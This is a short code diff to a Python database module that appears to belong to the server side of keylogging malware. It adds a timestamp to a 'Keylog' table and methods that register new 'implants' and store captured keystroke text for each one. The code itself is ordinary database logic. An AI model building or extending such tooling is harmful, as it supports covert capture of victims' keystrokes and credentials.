@@ -24,7 +24,7 @@ class Keylog(Base):
     id = Column(Integer, primary_key=True)
     text = Column(String)
     implantid = Column(Integer, ForeignKey("implant.id"), nullable=False)
-
+    timestamp = Column(DateTime, default=func.now())
 class Database:
     
     def start_db(self):
@@ -51,3 +51,18 @@ class Database:
             implants = s.query(Implant).all()
             
             return [{"id": i.id, "firstconnected": i.firstconnected, "isactive": i.isactive} for i in implants]
+    
+
+    def new_implant(self):
+        with self.Session() as s:
+            new_implant = Implant()
+            s.add(new_implant)
+            s.commit()
+            return {"id":new_implant.id}
+    
+    def new_keylog(self, text, implantid):
+        with self.Session() as s:
+            new_keylog = Keylog(text=text, implantid=implantid)
+            s.add(new_keylog)
+            s.commit()
+            return {"id": new_keylog.id}
